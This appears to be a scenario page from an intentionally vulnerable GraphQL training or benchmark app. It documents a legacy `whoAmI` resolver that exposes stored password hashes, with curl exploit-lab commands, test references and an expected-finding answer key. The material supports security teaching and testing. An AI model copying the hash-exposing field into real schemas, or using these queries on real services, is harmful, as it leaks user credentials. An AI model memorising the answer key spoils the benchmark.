# `GQL` — GraphQL itself

The scenario of the graph's own shape in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

## GQL-005 — the password hash is a field of the record

### GQL-005 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `whoAmI: UserRecord` |
| Sink | `passwordHash` is a `@Field` of the `UserRecord` type, in `apps/accounts/src/legacy/whoami.resolver.ts` |
| Flow | any token → `whoAmI` → the stored hash is selected and returned |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: `User` has no such field), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: admin only, and its `User` has no such field either) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-200, SAST |

### GQL-005 — student guide

The graph's `User` type has no hash field, so no selection of `me` or `user` can ask for one: the schema refuses the query before it runs. The legacy record type added the hash as a field for the old client, and every caller of `whoAmI` can select it.

### GQL-005 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ whoAmI { id passwordHash } }"}'
{"data":{"whoAmI":{"id":"u-alice","passwordHash":"scrypt$16384$8$1$23fd6b1132f80ec3…"}}}

$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ me { passwordHash } }"}'
{"errors":[{"message":"Cannot query field \"passwordHash\" on type \"User\".",
  "extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
```

`$TOKEN` is any token the caller holds — the field is there for whoever asks. `user(id: "u-alice") { passwordHash }` as an administrator fails the same way: no such field on `User`; as a user it is refused first (`FORBIDDEN`).

### GQL-005 — vulnerable and protected

| | Why |
| --- | --- |
| `whoAmI` (vulnerable) | `UserRecord` exposes the stored hash as a selectable field |
| `me` (protected) | `User` carries no hash field: the selection is a validation error before any resolver runs |
| `user(id)` (protected) | An administrator's operation, and still no hash field to select |

### GQL-005 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `GQL-005`: `whoAmI` returns the stored hash; `me { passwordHash }` and `user(id) { passwordHash }` are `GRAPHQL_VALIDATION_FAILED`; `user(id)` as a user is `FORBIDDEN`.
